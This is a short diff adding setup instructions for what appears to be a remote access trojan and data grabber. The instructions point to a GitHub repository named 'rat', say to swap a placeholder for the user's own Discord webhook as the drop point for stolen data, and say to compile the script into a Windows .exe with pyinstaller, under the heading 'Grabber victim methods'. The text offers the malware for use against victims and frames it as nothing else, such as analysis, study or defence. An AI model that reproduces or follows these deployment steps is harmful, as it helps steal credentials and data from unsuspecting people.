@@ -1,0 +1,5 @@
+Copy the code at "https://github.com/yanibornea/rat/blob/main/main.py"
+After that change the "ENTERINYOURWEBHOOK" parts with your actual discord webhook, 
+Then you can use pyinstaller to turn it into a .exe file
+
+Grabber victim methods
